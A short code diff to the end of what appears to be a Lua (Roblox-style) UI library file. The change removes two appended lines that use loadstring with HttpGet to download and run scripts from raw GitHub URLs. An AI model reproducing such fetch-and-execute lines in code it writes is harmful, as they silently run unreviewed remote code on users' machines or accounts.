@@ -3633,5 +3633,4 @@ function initLibrary()
 
     return library
 end
-loadstring(game:HttpGet("https://raw.githubusercontent.com/laagginq/misc-scripts/main/test.lua"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/laagginq/lol/main/skids.lua"))()
+
